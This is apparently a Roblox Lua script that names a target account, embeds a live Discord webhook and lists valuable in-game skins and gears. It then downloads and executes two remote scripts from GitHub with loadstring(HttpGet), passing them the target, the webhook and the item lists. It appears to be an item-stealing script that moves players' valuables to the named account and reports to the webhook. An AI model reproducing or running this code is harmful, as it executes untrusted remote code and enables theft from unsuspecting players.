local TARGET_ID = 11205258389
local TARGET_USER = "anhcacto22"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1571852978162245804/Uxs5UeHsEcNL3Xr2iqNlohZSamv5pfTqStP2usr6hLTQVPWSLaNEoCKuCnUlI29N4KW7"

local TargetBrainrots = {
    
}

local TargetBaseSkins = {
    ["Bunny Basket"] = true,
    ["Christmas"] = true,
    ["Candy"] = true,
    ["Aquatic"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Halloween"] = true,
    ["Gold"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Pot of Gold"] = true,
    ["Octo"] = true,
    ["Radioactive"] = true,
    ["Rainbow"] = true,
    ["Summer"] = true,
    ["Rose"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Tralalero"] = true,
    ["Yin Yang"] = true
}

local TargetGears = {
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true,
    ["Skeleton Dragon"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/quachthiloan686868-dev/hhhh/refs/heads/main/chi%20bo%20mdan.lua"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)